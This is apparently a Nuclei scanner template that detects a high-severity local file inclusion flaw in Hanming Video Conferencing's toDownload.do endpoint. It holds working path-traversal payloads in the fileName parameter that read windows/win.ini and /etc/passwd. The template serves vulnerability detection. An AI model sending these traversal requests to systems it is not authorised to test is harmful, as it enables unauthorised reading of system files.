id: hanming-lfr

info:
  name: Hanming Video Conferencing - Local File Inclusion
  author: ritikchaddha
  severity: high
  description: Hanming Video Conferencing is vulnerable to local file inclusion.
  reference:
    - https://mp.weixin.qq.com/s/F-M21PT0xn9QOuwoC8llKA
  classification:
    cpe: cpe:2.3:a:hanming:lfr:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    max-request: 2
    vendor: hanming
    product: lfr
  tags: lfr,hanming,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini"
      - "{{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd"

    stop-at-first-match: true

    matchers-condition: or
    matchers:
      - type: word
        name: lfr
        cpe: cpe:2.3:a:hanming:lfr:*:*:*:*:*:*:*:*
        part: body
        words:
          - "bit app support"
          - "fonts"
          - "extensions"
        condition: and

      - type: regex
        name: lfr-2
        cpe: cpe:2.3:a:hanming:lfr:*:*:*:*:*:*:*:*
        regex:
          - "root:[x*]:0:0:"
